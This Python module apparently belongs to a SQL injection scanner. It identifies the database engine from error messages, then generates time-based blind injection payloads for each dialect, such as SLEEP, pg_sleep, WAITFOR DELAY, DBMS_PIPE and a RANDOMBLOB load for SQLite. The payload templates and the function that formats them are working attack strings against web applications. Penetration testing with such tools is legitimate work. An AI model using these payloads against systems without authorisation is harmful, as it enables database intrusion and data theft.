"""DBMS fingerprinting from error messages and dialect quirks."""

from __future__ import annotations

import re
from typing import Dict, List

from .models import DBMS

# Regexes that appear in DB error output, keyed by DBMS.
_ERROR_SIGNATURES: Dict[DBMS, List[re.Pattern]] = {
    DBMS.MYSQL: [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning.*\bmysqli?_", re.I),
        re.compile(r"mysql_fetch", re.I),
        re.compile(r"\bmariadb\b", re.I),
        re.compile(r"valid mysql result", re.I),
    ],
    DBMS.POSTGRESQL: [
        re.compile(r"pg_query\(\)|pg_exec\(\)", re.I),
        re.compile(r"postgresql.*error", re.I),
        re.compile(r"unterminated quoted string at or near", re.I),
        re.compile(r"syntax error at or near", re.I),
    ],
    DBMS.MSSQL: [
        re.compile(r"unclosed quotation mark after the character string", re.I),
        re.compile(r"microsoft sql server", re.I),
        re.compile(r"\bODBC SQL Server Driver\b", re.I),
        re.compile(r"incorrect syntax near", re.I),
        re.compile(r"System\.Data\.SqlClient\.", re.I),
    ],
    DBMS.ORACLE: [
        re.compile(r"\bORA-\d{5}", re.I),
        re.compile(r"oracle.*driver", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
    ],
    DBMS.SQLITE: [
        re.compile(r"sqlite3?::", re.I),
        re.compile(r"sqlite_error", re.I),
        re.compile(r"unrecognized token:", re.I),
        re.compile(r"near \".*\": syntax error", re.I),
    ],
}


def fingerprint_from_error(body: str) -> DBMS:
    """Return the DBMS whose error signature matches ``body``, else UNKNOWN."""
    for dbms, patterns in _ERROR_SIGNATURES.items():
        for rx in patterns:
            if rx.search(body):
                return dbms
    return DBMS.UNKNOWN


def has_sql_error(body: str) -> bool:
    return fingerprint_from_error(body) is not DBMS.UNKNOWN


# Dialect-specific time-delay payload templates. ``{d}`` is delay seconds.
TIME_PAYLOADS: Dict[DBMS, List[str]] = {
    DBMS.MYSQL: [
        "' AND SLEEP({d})-- -",
        "' AND (SELECT 1 FROM (SELECT SLEEP({d}))x)-- -",
        "\" AND SLEEP({d})-- -",
        " AND SLEEP({d})",
    ],
    DBMS.POSTGRESQL: [
        "' AND (SELECT pg_sleep({d}))-- -",
        "'; SELECT pg_sleep({d})-- -",
    ],
    DBMS.MSSQL: [
        "'; WAITFOR DELAY '0:0:{d}'-- -",
        " WAITFOR DELAY '0:0:{d}'",
    ],
    DBMS.ORACLE: [
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- -",
    ],
    DBMS.SQLITE: [
        # SQLite has no sleep; a heavy randomblob keeps it busy.
        "' AND {heavy}-- -",
    ],
}


def time_payloads(dbms: DBMS, delay: int) -> List[str]:
    """Return time-based payloads for ``dbms`` (or all dialects if unknown)."""
    if dbms is DBMS.UNKNOWN:
        out: List[str] = []
        for d in (DBMS.MYSQL, DBMS.POSTGRESQL, DBMS.MSSQL):
            out.extend(p.format(d=delay) for p in TIME_PAYLOADS[d])
        return out
    if dbms is DBMS.SQLITE:
        heavy = "1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))"
        return [p.format(d=delay, heavy=heavy) for p in TIME_PAYLOADS[dbms]]
    return [p.format(d=delay) for p in TIME_PAYLOADS[dbms]]
